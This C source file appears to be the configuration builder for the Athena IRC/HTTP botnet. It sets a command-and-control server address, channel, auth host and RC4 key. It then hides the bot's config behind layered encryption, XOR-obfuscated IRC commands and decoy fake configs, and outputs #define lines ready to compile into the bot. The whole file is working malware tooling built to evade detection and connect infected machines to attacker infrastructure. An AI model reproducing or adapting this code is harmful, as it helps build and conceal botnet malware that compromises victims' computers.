#include "includes.h"

// <!-------! CONFIG AREA START !-------!>

char cServer[128] = "whatthedev.pw/AcdzWBddcC23DcGH/";
char cBackup[128] = "";
unsigned short usPort = 80;
char cChannel[56] = "#Athena";
char cChannelKey[56] = "";
char cAuthHost[100] = "bossnets336";
char cServerPass[56] = "";

char cRc4Key[250] = "Imagination is more important than knowledge.";

char cHttpVersion[50] = "v1.1.1";
char cIrcVersion[50] = "Athena-v2.4.1";

// <!-------! CONFIG AREA STOP !-------!>

char cOwner[56] = "User";
char cVersion[50];

int main()
{
    int nTries = 0;
start:
    nTries++;

    memset(cVersion, 0, sizeof(cVersion));

    if(strstr(cServer, "/"))
    {
        strcpy(cVersion, cHttpVersion);

        memset(cChannel, 0, sizeof(cChannel));
        strcpy(cChannel, GenRandLCText());

        memset(cChannelKey, 0, sizeof(cChannelKey));
        strcpy(cChannelKey, GenRandLCText());

        memset(cAuthHost, 0, sizeof(cAuthHost));
        strcpy(cAuthHost, GenRandLCText());

        memset(cOwner, 0, sizeof(cOwner));
        strcpy(cOwner, GenRandLCText());

        memset(cServerPass, 0, sizeof(cServerPass));
        strcpy(cServerPass, GenRandLCText());
    }
    else
        strcpy(cVersion, cIrcVersion);

    srand(time(0));
    if(strlen(cChannelKey) == 0)
        strcpy(cChannelKey, "0");

    if(strlen(cServerPass) == 0)
        strcpy(cServerPass, "0");

    if(strlen(cBackup) == 0)
        strcpy(cBackup, "0");

    if(strlen(cVersion) == 0)
    {
        printf("Invalid value for cVersion\n");
        system("pause");
        return 0;
    }

    if(strlen(cServer) == 0)
    {
        printf("Invalid value for cServer\n");
        system("pause");
        return 0;
    }

    if(strlen(cChannel) == 0)
    {
        printf("Invalid value for cChannel\n");
        system("pause");
        return 0;
    }

    if(strlen(cAuthHost) == 0)
    {
        printf("Invalid value for cAuthHost\n");
        system("pause");
        return 0;
    }

    memset(cOwner, 0, sizeof(cOwner));
    strcpy(cOwner, GenRandLCText());

    if(strlen(cOwner) == 0)
    {
        printf("Invalid value for cOwner\n");
        system("pause");
        return 0;
    }

    if((usPort > 65535) || usPort < 1)
    {
        printf("Invalid value for usPort\n");
        system("pause");
        return 0;
    }

    char cConfig[10 * (strlen(cVersion) + strlen(cServer) + strlen(cChannel) + strlen(cChannelKey) + strlen(cAuthHost) + strlen(cOwner) + strlen(cServerPass) + 6)];
    memset(cConfig, 0, sizeof(cConfig));
    sprintf(cConfig, "%s%s%i%s%s%s%s%s", cVersion, cServer,
            usPort, cChannel, cChannelKey,
            cAuthHost, cOwner, cServerPass);
    unsigned long ulChecksum1 = GetHash((unsigned char*)cConfig);

    sprintf(cConfig, "%s--%s", cVersion, cOwner);
    unsigned long ulChecksum2 = GetHash((unsigned char*)cConfig);

    sprintf(cConfig, "%s:%i", cServer, usPort);
    unsigned long ulChecksum3 = GetHash((unsigned char*)cConfig);

    sprintf(cConfig, "%s(%s)", cChannel, cChannelKey);
    unsigned long ulChecksum4 = GetHash((unsigned char*)cConfig);

    sprintf(cConfig, "%s %s", cAuthHost, cOwner);
    unsigned long ulChecksum5 = GetHash((unsigned char*)cConfig);

    sprintf(cConfig, "%s@%s", cServer, cChannel);
    unsigned long ulChecksum6 = GetHash((unsigned char*)cConfig);

    sprintf(cConfig, "%s@%s:%i", cChannel, cServer, usPort);
    unsigned long ulChecksum7 = GetHash((unsigned char*)cConfig);

    sprintf(cConfig, "%s & %s", cVersion, cOwner);
    unsigned long ulChecksum8 = GetHash((unsigned char*)cConfig);

    sprintf(cConfig, "%s", cVersion);
    unsigned long ulChecksum9 = GetHash((unsigned char*)cConfig);

    char cIrcCommandPrivmsg[8] = { 0 };
    strcpy(cIrcCommandPrivmsg, "PRIVMSG");

    char cIrcCommandJoin[5] = { 0 };
    strcpy(cIrcCommandJoin, "JOIN");

    char cIrcCommandPart[5] = { 0 };
    strcpy(cIrcCommandPart, "PART");

    char cIrcCommandUser[5] = { 0 };
    strcpy(cIrcCommandUser, "USER");

    char cIrcCommandNick[5] = { 0 };
    strcpy(cIrcCommandNick, "NICK");

    char cIrcCommandPass[5] = { 0 };
    strcpy(cIrcCommandPass, "PASS");

    char cIrcCommandPong[5] = { 0 };
    strcpy(cIrcCommandPong, "PONG");

    unsigned short usStrlenBasedKey = strlen(cVersion) + strlen(cServer) + strlen(cChannel) + strlen(cAuthHost);

    strcpy(cIrcCommandPrivmsg, SimpleDynamicXor(cIrcCommandPrivmsg, usStrlenBasedKey));
    strcpy(cIrcCommandJoin, SimpleDynamicXor(cIrcCommandJoin, usStrlenBasedKey));
    strcpy(cIrcCommandPart, SimpleDynamicXor(cIrcCommandPart, usStrlenBasedKey));
    strcpy(cIrcCommandUser, SimpleDynamicXor(cIrcCommandUser, usStrlenBasedKey));
    strcpy(cIrcCommandNick, SimpleDynamicXor(cIrcCommandNick, usStrlenBasedKey));
    strcpy(cIrcCommandPass, SimpleDynamicXor(cIrcCommandPass, usStrlenBasedKey));
    strcpy(cIrcCommandPong, SimpleDynamicXor(cIrcCommandPong, usStrlenBasedKey));

    strcpy(cBackup, SimpleDynamicXor(cBackup, usStrlenBasedKey));

    sprintf(cConfig, "%s+%s+%i+%s+%s+%s+%s+%s+%li+%li+%li+%li+%li+%li+%li+%li+%li+%i+%i+%i+%i+%i+%i+%s+%s+%s+%s+%s+%s+%s+%s+1+0", cVersion, cServer,
            usPort, cChannel, cChannelKey,
            cAuthHost, cOwner, cServerPass,
            ulChecksum1, ulChecksum2, ulChecksum3,
            ulChecksum4, ulChecksum5, ulChecksum6,
            ulChecksum7, ulChecksum8, ulChecksum9,
            strlen(cVersion), strlen(cServer), strlen(cChannel),
            strlen(cChannelKey), strlen(cAuthHost), strlen(cServerPass),
            cIrcCommandPrivmsg, cIrcCommandJoin, cIrcCommandPart,
            cIrcCommandUser, cIrcCommandNick, cIrcCommandPass,
            cIrcCommandPong, cBackup);

    char cStoredConfig[strlen(cConfig)];
    memset(cStoredConfig, 0, sizeof(cStoredConfig));
    strcpy(cStoredConfig, cConfig);

    unsigned short nEncryptLoops = rand()%499+100;
    for(unsigned short us = 0; us <= nEncryptLoops; us++)
        strcpy(cConfig, EncryptConfig(cConfig));

    char cProcessString[strlen(cConfig) + 20];
    memset(cProcessString, 0, sizeof(cProcessString));
    sprintf(cProcessString, "@%i%s", nEncryptLoops, cConfig);

    strcpy(cConfig, cProcessString);

    nEncryptLoops = rand()%499+100;
    for(unsigned short us = 0; us <= nEncryptLoops; us++)
        strcpy(cConfig, EncryptConfig(cConfig));

    sprintf(cProcessString, "%i%s", nEncryptLoops, cConfig);

    for(unsigned short us = 0; us < strlen(cProcessString); us++)
        cProcessString[us] = cProcessString[us] + 69;

    unsigned short usFakeConfigStringLength = strlen(cProcessString);

    char cRc4EncryptedConfig[strlen(cProcessString)];
    memset(cRc4EncryptedConfig, 0, sizeof(cRc4EncryptedConfig));
    rc4(cProcessString, cRc4Key, cRc4EncryptedConfig);

    char cBase64Encrypted[strlen(cRc4EncryptedConfig) * 3];
    memset(cBase64Encrypted, 0, sizeof(cBase64Encrypted));
    base64_encode((unsigned char*)cRc4EncryptedConfig, strlen(cRc4EncryptedConfig), cBase64Encrypted, sizeof(cBase64Encrypted));

    SwapBase64ToNonBase64(cBase64Encrypted);

    char cFinalEncryptedConfig[strlen(cBase64Encrypted)];
    memset(cFinalEncryptedConfig, 0, sizeof(cFinalEncryptedConfig));
    strcpy(cFinalEncryptedConfig, cBase64Encrypted);

    //--------------------------------------------------------------------

    SwapNonBase64ToBase64(cBase64Encrypted);

    char cBase64Decrypted[strlen(cBase64Encrypted)];
    memset(cBase64Decrypted, 0, sizeof(cBase64Decrypted));
    base64_decode(cBase64Encrypted, cBase64Decrypted, sizeof(cBase64Decrypted));

    memset(cProcessString, 0, sizeof(cProcessString));
    rc4(cBase64Decrypted, cRc4Key, cProcessString);

    for(unsigned short us = 0; us < strlen(cProcessString); us++)
        cProcessString[us] = cProcessString[us] - 69;

    char cDecryptLoops[4] = { 0 };
    memcpy(cDecryptLoops, cProcessString, 3);
    unsigned short nDecryptLoops = atoi(cDecryptLoops);

    memset(cConfig, 0, sizeof(cConfig));
    for(unsigned short us = 3; us < strlen(cProcessString); us++)
        cConfig[us - 3] = cProcessString[us];

    for(unsigned short us = 0; us <= nDecryptLoops; us++)
        strcpy(cConfig, DecryptConfig(cConfig));

    memset(cDecryptLoops, 0, sizeof(cDecryptLoops));
    memcpy(cDecryptLoops, cConfig + 1, 3);
    nDecryptLoops = atoi(cDecryptLoops);

    for(unsigned short us = 4; us < strlen(cConfig); us++)
        cProcessString[us - 4] = cConfig[us];

    memset(cConfig, 0, sizeof(cConfig));
    strcpy(cConfig, cProcessString);

    for(unsigned short us = 0; us <= nDecryptLoops; us++)
        strcpy(cConfig, DecryptConfig(cConfig));

    unsigned long ulCheckHash_Initial;
    ulCheckHash_Initial = GetHash((unsigned char*)cStoredConfig);

    unsigned long ulCheckHash_Final;
    ulCheckHash_Final = GetHash((unsigned char*)cConfig);

    //if(ulCheckHash_Initial == ulCheckHash_Final)
    //if(ulCheckHash_Initial == ulCheckHash_Final && strlen(cStoredConfig) == strlen(cConfig) && strlen(cFinalEncryptedConfig) > strlen(cStoredConfig))
    if(strstr(cConfig, cStoredConfig))
    {
        char cDecryptedVersion[256];
        char cDecryptedServer[256];
        unsigned short usDecryptedPort = 0;
        char cDecryptedChannel[256];
        char cDecryptedChannelKey[256];
        char cDecryptedAuthHost[256];
        char cDecryptedOwner[256];
        char cDecryptedServerPass[256];

        unsigned long ulDecryptedChecksum1;
        unsigned long ulDecryptedChecksum2;
        unsigned long ulDecryptedChecksum3;
        unsigned long ulDecryptedChecksum4;
        unsigned long ulDecryptedChecksum5;
        unsigned long ulDecryptedChecksum6;
        unsigned long ulDecryptedChecksum7;
        unsigned long ulDecryptedChecksum8;
        unsigned long ulDecryptedChecksum9;

        unsigned short usVersionLength;
        unsigned short usServerLength;
        unsigned short usChannelLength;
        unsigned short usChannelKeyLength;
        unsigned short usAuthHostLength;
        unsigned short usServerPassLength;

        char cBreakConfig[strlen(cConfig)];
        memset(cBreakConfig, 0, sizeof(cBreakConfig));
        strcpy(cBreakConfig, cConfig);

        char *cBreakString = (char*)malloc(strlen(cBreakConfig));
        cBreakString = strtok(cBreakConfig, "+");
        unsigned short nBreakStringLoops = 0;
        while(cBreakString != NULL)
        {
            nBreakStringLoops++;

            if(nBreakStringLoops == 1)
                strcpy(cDecryptedVersion, cBreakString);
            else if(nBreakStringLoops == 2)
                strcpy(cDecryptedServer, cBreakString);
            else if(nBreakStringLoops == 3)
                usDecryptedPort = atoi(cBreakString);
            else if(nBreakStringLoops == 4)
                strcpy(cDecryptedChannel, cBreakString);
            else if(nBreakStringLoops == 5)
                strcpy(cDecryptedChannelKey, cBreakString);
            else if(nBreakStringLoops == 6)
                strcpy(cDecryptedAuthHost, cBreakString);
            else if(nBreakStringLoops == 7)
                strcpy(cDecryptedOwner, cBreakString);
            else if(nBreakStringLoops == 8)
                strcpy(cDecryptedServerPass, cBreakString);
            else if(nBreakStringLoops == 9)
                ulDecryptedChecksum1 = atoi(cBreakString);
            else if(nBreakStringLoops == 10)
                ulDecryptedChecksum2 = atoi(cBreakString);
            else if(nBreakStringLoops == 11)
                ulDecryptedChecksum3 = atoi(cBreakString);
            else if(nBreakStringLoops == 12)
                ulDecryptedChecksum4 = atoi(cBreakString);
            else if(nBreakStringLoops == 13)
                ulDecryptedChecksum5 = atoi(cBreakString);
            else if(nBreakStringLoops == 14)
                ulDecryptedChecksum6 = atoi(cBreakString);
            else if(nBreakStringLoops == 15)
                ulDecryptedChecksum7 = atoi(cBreakString);
            else if(nBreakStringLoops == 16)
                ulDecryptedChecksum8 = atoi(cBreakString);
            else if(nBreakStringLoops == 17)
                ulDecryptedChecksum9 = atoi(cBreakString);
            else if(nBreakStringLoops == 18)
                usVersionLength = atoi(cBreakString);
            else if(nBreakStringLoops == 19)
                usServerLength = atoi(cBreakString);
            else if(nBreakStringLoops == 20)
                usChannelLength = atoi(cBreakString);
            else if(nBreakStringLoops == 21)
                usChannelKeyLength = atoi(cBreakString);
            else if(nBreakStringLoops == 22)
                usAuthHostLength = atoi(cBreakString);
            else if(nBreakStringLoops == 23)
                usServerPassLength = atoi(cBreakString);
            else if(nBreakStringLoops == 24)
                strcpy(cIrcCommandPrivmsg, SimpleDynamicXor(cIrcCommandPrivmsg, usStrlenBasedKey));
            else if(nBreakStringLoops == 25)
                strcpy(cIrcCommandJoin, SimpleDynamicXor(cIrcCommandJoin, usStrlenBasedKey));
            else if(nBreakStringLoops == 26)
                strcpy(cIrcCommandPart, SimpleDynamicXor(cIrcCommandPart, usStrlenBasedKey));
            else if(nBreakStringLoops == 27)
                strcpy(cIrcCommandUser, SimpleDynamicXor(cIrcCommandUser, usStrlenBasedKey));
            else if(nBreakStringLoops == 28)
                strcpy(cIrcCommandNick, SimpleDynamicXor(cIrcCommandNick, usStrlenBasedKey));
            else if(nBreakStringLoops == 29)
                strcpy(cIrcCommandPass, SimpleDynamicXor(cIrcCommandPass, usStrlenBasedKey));
            else if(nBreakStringLoops == 30)
                strcpy(cIrcCommandPong, SimpleDynamicXor(cIrcCommandPong, usStrlenBasedKey));
            else if(nBreakStringLoops == 31)
                strcpy(cBackup, SimpleDynamicXor(cBackup, usStrlenBasedKey));

            if(nBreakStringLoops == 8)
                usStrlenBasedKey = strlen(cDecryptedVersion) + strlen(cDecryptedServer) + strlen(cDecryptedChannel) + strlen(cDecryptedAuthHost);

            cBreakString = strtok(NULL, "+");
        }
        free(cBreakString);

        printf("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nChecksum(Initial Config): %li\n"
               "Initial Config:\n%s\n\n"
               "Checksum(Final Config): %li\n"
               "Final Config:\n%s\n"
               "\n\n", ulCheckHash_Initial, cStoredConfig, ulCheckHash_Final, cConfig);

        printf("Final product passed testing after %i tries.\n"
               "Decrypted Contents...\n"
               "Version: %s\n"
               "Server: %s\n"
               "Backup: %s\n"
               "Port: %i\n"
               "Channel: %s\n"
               "Channel Key: %s\n"
               "Auth-Host: %s\n"
               "Licensed Owner: %s\n"
               "Server Pass: %s\n"
               "Checksum[1]: %li\n"
               "Checksum[2]: %li\n"
               "Checksum[3]: %li\n"
               "Checksum[4]: %li\n"
               "Checksum[5]: %li\n"
               "Checksum[6]: %li\n"
               "Checksum[7]: %li\n"
               "Checksum[8]: %li\n"
               "Checksum[9]: %li\n"
               "Version Length: %i\n"
               "Server Length: %i\n"
               "Channel Length: %i\n"
               "Channel Key Length: %i\n"
               "AuthHost Length: %i\n"
               "Server Pass Length: %i\n"
               "PRIVMSG Decrypted: %s\n"
               "JOIN Decrypted: %s\n"
               "PART Decrypted: %s\n"
               "USER Decrypted: %s\n"
               "NICK Decrypted: %s\n"
               "PASS Decrypted: %s\n"
               "PONG Decrypted: %s\n\n", nTries, cDecryptedVersion, cDecryptedServer, cBackup, usDecryptedPort,
               cDecryptedChannel, cDecryptedChannelKey, cDecryptedAuthHost, cDecryptedOwner,
               cDecryptedServerPass, ulDecryptedChecksum1, ulDecryptedChecksum2, ulDecryptedChecksum3,
               ulDecryptedChecksum4, ulDecryptedChecksum5, ulDecryptedChecksum6, ulDecryptedChecksum7,
               ulDecryptedChecksum8, ulDecryptedChecksum9, usVersionLength, usServerLength, usChannelLength,
               usChannelKeyLength, usAuthHostLength, usServerPassLength, cIrcCommandPrivmsg, cIrcCommandJoin,
               cIrcCommandPart, cIrcCommandUser, cIrcCommandNick, cIrcCommandPass, cIrcCommandPong);

        printf("Encrypted Config:\n%s\n\n", cFinalEncryptedConfig);

        //---------------------------------------------------------------------------
        char cDataInput[5000];

        unsigned short usRandNum = rand()%4;

        for(unsigned short us = 0; us < 4; us++)
        {
            if(us == 0)
                strcpy(cDataInput, "#define SPECIAL_STRING_1 \"");
            else if(us == 1)
                strcat(cDataInput, "#define SPECIAL_STRING_2 \"");
            else if(us == 2)
                strcat(cDataInput, "#define SPECIAL_STRING_3 \"");
            else if(us == 3)
                strcat(cDataInput, "#define SPECIAL_STRING_4 \"");

            if(us == usRandNum)
            {
                strcat(cDataInput, cFinalEncryptedConfig);
                strcat(cDataInput, "\"\n");
            }
            else
            {
                char cGenerateFakeEncryptedConfig[usFakeConfigStringLength];
                memset(cGenerateFakeEncryptedConfig, 0, sizeof(cGenerateFakeEncryptedConfig));

                char cRandomCharacters[usFakeConfigStringLength];
                memset(cRandomCharacters, 0, sizeof(cRandomCharacters));
                for(unsigned short usGFC = 0; usGFC < usFakeConfigStringLength; usGFC++)
                    cRandomCharacters[usGFC] = cPoolOfCharacters[rand()%76];

                sprintf(cGenerateFakeEncryptedConfig, "%i%s", (rand()%899)+100, cRandomCharacters);

                for(unsigned short us = 0; us < strlen(cGenerateFakeEncryptedConfig); us++)
                    cGenerateFakeEncryptedConfig[us] = cGenerateFakeEncryptedConfig[us] + 50;

                char cRc4EncryptedFakeConfig[usFakeConfigStringLength];
                memset(cRc4EncryptedFakeConfig, 0, sizeof(cRc4EncryptedFakeConfig));
                rc4(cGenerateFakeEncryptedConfig, cRc4Key, cRc4EncryptedFakeConfig);

                char cBase64EncryptedFakeConfig[strlen(cRc4EncryptedFakeConfig) * 3];
                memset(cBase64EncryptedFakeConfig, 0, sizeof(cBase64EncryptedFakeConfig));
                base64_encode((unsigned char*)cRc4EncryptedFakeConfig, strlen(cRc4EncryptedFakeConfig), cBase64EncryptedFakeConfig, sizeof(cBase64EncryptedFakeConfig));

                SwapBase64ToNonBase64(cBase64EncryptedFakeConfig);

                strcat(cDataInput, cBase64EncryptedFakeConfig);
                strcat(cDataInput, "\"\n");
            }
        }

        printf("Output:\n%s\n", cDataInput);

        //---------------------------------------------------------------------------

        if(CopyToClipboard(cDataInput))
            printf("Copied data to clipboard.\n\n");
        else
            printf("Failed to copy data to clipboard.\n\n");

        /*FILE * configFile;
        char configFileName[126];
        sprintf(configFileName, "%s-%s.bin", cDecryptedOwner, cDecryptedVersion);
        configFile = fopen(configFileName, "w");

        if(configFile != NULL)
        {
            fputs(cDataInput, configFile);
            free(cDataInput);
            fclose(configFile);

            char cNotepadPath[MAX_PATH];
            strcpy(cNotepadPath, getenv("WINDIR"));
            strcat(cNotepadPath, "\\System32\\notepad.exe ");
            strcat(cNotepadPath, configFileName);

            dwConfigFileProcessPid = StartProcessFromPath(cNotepadPath, FALSE);

            if(dwConfigFileProcessPid != 0)
                printf("Wrote and opened file: \'%s\'\n\n", configFileName);
            else
                printf("Wrote but failed to open config file: \'%s\'\n\n", configFileName);
        }
        else
            printf("Failed to write to file: \'%s\'\n\n", configFileName);*/
    }
    else
    {
        printf("\n\n\n\n\n\nTries: %i\n\nChecksum(Initial Config): %li\n"
               "Initial Config:\n%s\n\n"
               "Checksum(Final Config): %li\n"
               "Final Config:\n%s\n"
               "\n\n", nTries, ulCheckHash_Initial, cStoredConfig, ulCheckHash_Final, cConfig);
        printf("Final config check failed.\n");
        printf("----------------------------------------------------------------------\n");
        goto start;
    }

    system("pause");

    //if(dwConfigFileProcessPid != 0)
    //KillProcess(dwConfigFileProcessPid);

    return 0;
}
